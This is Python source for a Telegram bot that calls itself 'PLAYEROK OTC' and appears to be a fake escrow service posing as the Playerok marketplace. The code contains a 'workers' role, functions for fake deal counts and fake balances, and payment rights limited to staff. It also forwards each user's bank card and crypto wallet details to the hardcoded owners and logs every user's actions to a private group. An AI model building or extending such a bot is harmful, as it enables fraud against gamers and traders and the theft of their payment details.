import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, InputMediaPhoto, ReplyKeyboardMarkup, KeyboardButton
import uuid
import os
import pickle
from datetime import datetime, timedelta
from dotenv import load_dotenv

# Загружаем переменные окружения из .env файла
load_dotenv()

# Получаем токен из переменных окружения
TOKEN = os.getenv('BOT_TOKEN')

# Проверяем, что токен загружен
if not TOKEN:
    print("❌ ОШИБКА: Не найден BOT_TOKEN в .env файле!")
    print("ℹ️ Создайте файл .env в той же папке с содержимым:")
    print("BOT_TOKEN=ваш_токен_бота")
    exit(1)

print(f"✅ Токен загружен (длина: {len(TOKEN)} символов)")

# Создаем экземпляр бота с токеном из .env
bot = telebot.TeleBot(TOKEN)

# Получаем путь к папке, где находится скрипт
BASE_DIR = os.path.dirname(os.path.abspath(__file__))

# Пути к файлам данных
DATA_FILE = os.path.join(BASE_DIR, 'playerok_data.pkl')
PHOTO_PATH = os.path.join(BASE_DIR, 'photo.jpg')

# Глобальные переменные для данных
users = {}
deals = {}
deal_activities = {}  # Словарь для хранения действий в сделках
user_activities = {}  # Словарь для хранения действий пользователей
owners = set()  # Владельцы (высший уровень)
admins = set()  # Администраторы
workers = set()  # Воркеры
blocked_users = set()  # Заблокированные пользователи (новая функция)

# Состояния для рассылок
awaiting_broadcast_message = {}
awaiting_private_message = {}

# ID группы для логов
LOG_GROUP_ID = -1002248103959  # https://t.me/+_A9awiofJFkyMDYy
# ID тем в групке
TOPIC_STARTS = 117      # Старты бота
TOPIC_NEW_DEALS = 118   # Новые сделки  
TOPIC_SUCCESS_DEALS = 119  # Успешные сделки
TOPIC_TEXT_MESSAGES = 120  # Текстовые сообщения

# Менеджер для передачи товаров
MANAGER_USERNAME = "@ManagerToPlayerok"

# Проверка существования локального фото
print(f"🔍 Проверка локального фото: {PHOTO_PATH}")
if os.path.exists(PHOTO_PATH):
    try:
        with open(PHOTO_PATH, 'rb') as f:
            if f.read(1):
                PHOTO_AVAILABLE = True
                print(f"✅ Локальное фото найдено: {PHOTO_PATH}")
            else:
                PHOTO_AVAILABLE = False
                print(f"❌ Файл фото пустой: {PHOTO_PATH}")
    except Exception as e:
        PHOTO_AVAILABLE = False
        print(f"❌ Ошибка чтения фото: {e}")
else:
    PHOTO_AVAILABLE = False
    print(f"❌ Фото не найдено по пути: {PHOTO_PATH}")

# Если фото нет, создаём тестовое
if not PHOTO_AVAILABLE:
    try:
        from PIL import Image, ImageDraw, ImageFont
        
        img = Image.new('RGB', (800, 600), color='#1a1a2e')
        draw = ImageDraw.Draw(img)
        
        try:
            font = ImageFont.truetype("arial.ttf", 60)
        except:
            font = ImageFont.load_default()
        
        text = "PLAYEROK OTC"
        bbox = draw.textbbox((0, 0), text, font=font)
        text_width = bbox[2] - bbox[0]
        text_height = bbox[3] - bbox[1]
        x = (800 - text_width) // 2
        y = (600 - text_height) // 2
        
        draw.text((x, y), text, font=font, fill='#4cc9f0')
        img.save(PHOTO_PATH)
        PHOTO_AVAILABLE = True
        print(f"✅ Создано тестовое фото: {PHOTO_PATH}")
    except Exception as e:
        print(f"❌ Не удалось создать тестовое фото: {e}")
        PHOTO_AVAILABLE = False

# Функция для отправки сообщения в группу логов
def send_to_log_group(message, topic_id=None, parse_mode='HTML'):
    """Отправляет сообщение в группу логов"""
    try:
        if topic_id:
            bot.send_message(
                LOG_GROUP_ID,
                message,
                parse_mode=parse_mode,
                message_thread_id=topic_id
            )
        else:
            bot.send_message(
                LOG_GROUP_ID,
                message,
                parse_mode=parse_mode
            )
        return True
    except Exception as e:
        print(f"❌ Ошибка отправки в группу логов: {e}")
        return False

# Функция для логирования действий
def log_activity(user_id, action, deal_id=None, details=None):
    """Логирует действие пользователя или в сделке"""
    timestamp = datetime.now().strftime("%d.%m.%Y %H:%M:%S")
    
    # Логирование действий пользователя
    if user_id not in user_activities:
        user_activities[user_id] = []
    
    user_activity = {
        'action': action,
        'timestamp': timestamp,
        'deal_id': deal_id,
        'details': details
    }
    user_activities[user_id].append(user_activity)
    
    # Ограничиваем историю до последних 100 действий
    if len(user_activities[user_id]) > 100:
        user_activities[user_id] = user_activities[user_id][-100:]
    
    # Логирование действий в сделке
    if deal_id:
        if deal_id not in deal_activities:
            deal_activities[deal_id] = []
        
        deal_activity = {
            'action': action,
            'user_id': user_id,
            'timestamp': timestamp,
            'details': details
        }
        deal_activities[deal_id].append(deal_activity)
        
        # Ограничиваем историю до последних 50 действий
        if len(deal_activities[deal_id]) > 50:
            deal_activities[deal_id] = deal_activities[deal_id][-50:]
    
    # Отправка в соответствующие темы группы
    if action == 'Регистрация в системе':
        log_message = f"""
🆕 <b>НОВЫЙ ПОЛЬЗОВАТЕЛЬ</b>

👤 <b>Пользователь:</b> @{users[user_id]['username']}
🆔 <b>ID:</b> <code>{user_id}</code>
⏰ <b>Время:</b> {timestamp}

<b>Действие:</b> Первый запуск бота
"""
        send_to_log_group(log_message, TOPIC_STARTS)
    
    elif action == 'Создал новую сделку':
        deal = deals.get(deal_id, {})
        log_message = f"""
🆕 <b>НОВАЯ СДЕЛКА</b>

📋 <b>ID сделки:</b> #{deal_id[:8]}
👤 <b>Продавец:</b> @{users[user_id]['username']}
💰 <b>Сумма:</b> {deal.get('amount', 0)} {deal.get('currency', '')}
📁 <b>Категория:</b> {deal.get('category', 'Товар')}
⏰ <b>Время:</b> {timestamp}

<b>Описание:</b>
{deal.get('description', '')[:200]}
"""
        send_to_log_group(log_message, TOPIC_NEW_DEALS)
    
    elif action == 'Сделка завершена успешно':
        deal = deals.get(deal_id, {})
        log_message = f"""
✅ <b>СДЕЛКА ЗАВЕРШЕНА</b>

📋 <b>ID сделки:</b> #{deal_id[:8]}
👤 <b>Продавец:</b> @{users[deal.get('seller_id', 0)]['username']}
👤 <b>Покупатель:</b> @{users[deal.get('buyer_id', 0)]['username']}
💰 <b>Сумма:</b> {deal.get('amount', 0)} {deal.get('currency', '')}
⏰ <b>Время:</b> {timestamp}

<b>Статус:</b> Успешно завершена
"""
        send_to_log_group(log_message, TOPIC_SUCCESS_DEALS)
    
    # Логируем текстовые сообщения, которые никуда не относились
    elif (action in ['Обновил TON кошелёк', 'Обновил банковскую карту', 
                     'Обновил номер телефона', 'Обновил USDT кошелёк'] or
          'Отправил личное сообщение' in action or
          'Отправил рассылку' in action or
          'Заблокировал пользователя' in action or
          'Разблокировал пользователя' in action):
        log_message = f"""
💬 <b>ТЕКСТОВОЕ СООБЩЕНИЕ</b>

👤 <b>Пользователь:</b> @{users[user_id]['username']}
🆔 <b>ID:</b> <code>{user_id}</code>
⏰ <b>Время:</b> {timestamp}

<b>Действие:</b> {action}
<b>Детали:</b> {details[:200] if details else 'Нет деталей'}
"""
        send_to_log_group(log_message, TOPIC_TEXT_MESSAGES)
    
    save_data()

# Загрузка данных из файла
def load_data():
    """Загружает данные из файла"""
    global users, deals, owners, admins, workers, deal_activities, user_activities, blocked_users
    try:
        if os.path.exists(DATA_FILE):
            with open(DATA_FILE, 'rb') as f:
                data = pickle.load(f)
                users = data.get('users', {})
                deals = data.get('deals', {})
                owners = data.get('owners', set())
                admins = data.get('admins', set())
                workers = data.get('workers', set())
                deal_activities = data.get('deal_activities', {})
                user_activities = data.get('user_activities', {})
                blocked_users = data.get('blocked_users', set())
                print(f"✅ Данные загружены: {len(users)} пользователей, {len(deals)} сделок")
                print(f"👑 Владельцы: {len(owners)} | Админы: {len(admins)} | Воркеры: {len(workers)}")
                print(f"🚫 Заблокировано: {len(blocked_users)} пользователей")
                return data
    except Exception as e:
        print(f"❌ Ошибка загрузки данных: {e}")
    print("✅ Созданы новые данные")
    return {'users': {}, 'deals': {}, 'owners': set(), 'admins': set(), 'workers': set(), 'deal_activities': {}, 'user_activities': {}, 'blocked_users': set()}

# Сохранение данных в файл
def save_data():
    """Сохраняет данные в файл"""
    global users, deals, owners, admins, workers, deal_activities, user_activities, blocked_users
    try:
        data = {
            'users': users,
            'deals': deals,
            'owners': owners,
            'admins': admins,
            'workers': workers,
            'deal_activities': deal_activities,
            'user_activities': user_activities,
            'blocked_users': blocked_users
        }
        with open(DATA_FILE, 'wb') as f:
            pickle.dump(data, f)
        print(f"✅ Данные сохранены: {len(users)} пользователей, {len(deals)} сделок, {len(blocked_users)} заблокированных")
        return True
    except Exception as e:
        print(f"❌ Ошибка сохранения данных: {e}")
        return False

# Загрузка данных при старте
print("🔄 Загрузка данных...")
load_data()

# Добавление владельцев
OWNER_IDS = [1026776598, 1521791703]
for owner_id in OWNER_IDS:
    if owner_id not in owners:
        owners.add(owner_id)
        print(f"✅ ID {owner_id} добавлен как владелец")

# Добавляем владельцев также в админы для совместимости
for owner_id in owners:
    if owner_id not in admins:
        admins.add(owner_id)

save_data()

# Проверка блокировки пользователя
def is_user_blocked(user_id):
    """Проверяет, заблокирован ли пользователь"""
    return user_id in blocked_users

# Получение уровня пользователя
def get_user_level(user_id):
    """Возвращает уровень пользователя"""
    if user_id in owners:
        return "owner"
    elif user_id in admins:
        return "admin"
    elif user_id in workers:
        return "worker"
    else:
        return "regular"

# Проверка, может ли пользователь оплачивать
def can_user_pay(user_id):
    """Проверяет, может ли пользователь оплачивать сделки"""
    user_level = get_user_level(user_id)
    return user_level in ["worker", "admin", "owner"]

# Класс состояния для FSM
class DealState:
    SET_AMOUNT = 1
    SET_DESCRIPTION = 2
    WAIT_PAYMENT = 3
    SELLER_CONFIRMED = 4
    BUYER_CONFIRMED = 5

# Функция для отправки уведомления админу о новых реквизитах
def notify_admin_credentials(user_id, credential_type, new_value):
    """Отправляет уведомление админу о новых реквизитах пользователя"""
    if user_id not in users:
        return
    
    user = users[user_id]
    
    if credential_type == 'ton_wallet':
        icon = "⚡"
        name = "TON-кошелёк"
    elif credential_type == 'card_details':
        icon = "💳"
        name = "банковская карта"
    else:
        icon = "📝"
        name = "реквизиты"
    
    message = f"🔔 <b>НОВЫЕ РЕКВИЗИТЫ | PLAYEROK OTC</b>\n\n"
    message += f"👤 <b>Пользователь:</b> @{user['username']}\n"
    message += f"🆔 <b>ID:</b> {user_id}\n"
    message += f"📋 <b>Тип:</b> {name}\n"
    message += f"🔗 <b>Значение:</b>\n<code>{new_value}</code>\n\n"
    message += f"📊 <b>Статистика:</b>\n"
    message += f"• Сделок: {user['success_deals']}\n"
    message += f"• Рейтинг: {user['rating']}⭐"
    
    for owner_id in owners:
        try:
            bot.send_message(owner_id, message, parse_mode='HTML')
        except:
            pass
    
    for admin_id in admins:
        try:
            bot.send_message(admin_id, message, parse_mode='HTML')
        except:
            pass

# Инициализация данных пользователя
def init_user(user_id):
    global users
    if user_id not in users:
        try:
            chat = bot.get_chat(user_id)
            username = chat.username if chat.username else str(user_id)
        except:
            username = str(user_id)
        
        users[user_id] = {
            'username': username,
            'ton_wallet': 'Не указан',
            'card_details': 'Не указана',
            'phone_number': 'Не указан',
            'usdt_wallet': 'Не указан',
            'lang': 'ru',
            'currency': 'RUB',
            'success_deals': 0,
            'disputes_won': 0,
            'rating': 5.0,
            'balance': {'TON': 0.0, 'RUB': 0.0, 'USDT': 0.0, 'KZT': 0.0, 'UAH': 0.0, 'BYN': 0.0, 'USD': 0.0, 'STARS': 0.0},
            'referral_id': str(user_id),
            'deal_state': None,
            'current_deal': None,
            'awaiting_admin_id': False,
            'awaiting_worker_id': False,
            'awaiting_fake_deals': False,
            'awaiting_fake_balance': False,
            'awaiting_remove_worker': False,
            'awaiting_check_deals': False,
            'awaiting_ton_wallet': False,
            'awaiting_card_details': False,
            'awaiting_phone': False,
            'awaiting_usdt': False,
            'awaiting_deal_amount': False,
            'awaiting_deal_description': False,
            'awaiting_deal_category': False,
            'awaiting_search_deal': False,
            'awaiting_search_deal_activity': False,
            'awaiting_search_user_activity': False,
            'awaiting_search_recipient': False,
            'awaiting_block_user': False,
            'awaiting_unblock_user': False,
            'join_date': datetime.now().strftime("%d.%m.%Y"),
            'last_active': datetime.now().strftime("%d.%m.%Y %H:%M"),
            'is_blocked': False
        }
        save_data()
        print(f"✅ Новый пользователь: {user_id} @{username}")
        
        # Логируем создание пользователя
        log_activity(user_id, 'Регистрация в системе')

# Обновление времени активности пользователя
def update_user_activity(user_id):
    if user_id in users:
        users[user_id]['last_active'] = datetime.now().strftime("%d.%m.%Y %H:%M")

# Отправка/изменение сообщения с локальным фото
def send_photo_message(chat_id, message_id, text, reply_markup=None):
    try:
        if PHOTO_AVAILABLE:
            try:
                with open(PHOTO_PATH, 'rb') as photo:
                    if message_id:
                        bot.edit_message_media(
                            chat_id=chat_id,
                            message_id=message_id,
                            media=InputMediaPhoto(photo, caption=text, parse_mode='HTML'),
                            reply_markup=reply_markup
                        )
                    else:
                        bot.send_photo(
                            chat_id=chat_id,
                            photo=photo,
                            caption=text,
                            parse_mode='HTML',
                            reply_markup=reply_markup
                        )
                return
            except Exception as e:
                print(f"⚠️ Ошибка отправки локального фото: {e}")
                pass
        
        if message_id:
            bot.edit_message_text(
                chat_id=chat_id,
                message_id=message_id,
                text=text,
                parse_mode='HTML',
                reply_markup=reply_markup
            )
        else:
            bot.send_message(
                chat_id=chat_id,
                text=text,
                parse_mode='HTML',
                reply_markup=reply_markup
            )
    except Exception as e:
        print(f"Ошибка отправки сообщения: {e}")
        if message_id:
            bot.edit_message_text(
                chat_id=chat_id,
                message_id=message_id,
                text=text,
                parse_mode='HTML',
                reply_markup=reply_markup
            )
        else:
            bot.send_message(
                chat_id=chat_id,
                text=text,
                parse_mode='HTML',
                reply_markup=reply_markup
            )

# Приветственное сообщение
def get_welcome_text():
    return """
💙 <b>ДОБРО ПОЖАЛОВАТЬ В PLAYEROK OTC!</b>

🤍 Безопасные P2P-сделки для геймеров и трейдеров

⚡ <b>Быстро</b> — сделки за минуты
🔒 <b>Безопасно</b> — гарант защищает каждую сделку
💎 <b>Выгодно</b> — лучшие курсы на рынке

<b>ЧТО МОЖНО КУПИТЬ/ПРОДАТЬ:</b>
💙 Игровые аккаунты
🤍 Цифровые товары
💙 Ключи активации
🤍 Игровую валюту
💙 Telegram Stars
🤍 И многое другое!

<b>C любовью от @Playerok💙</b>

<b>Выберите действие:</b>
    """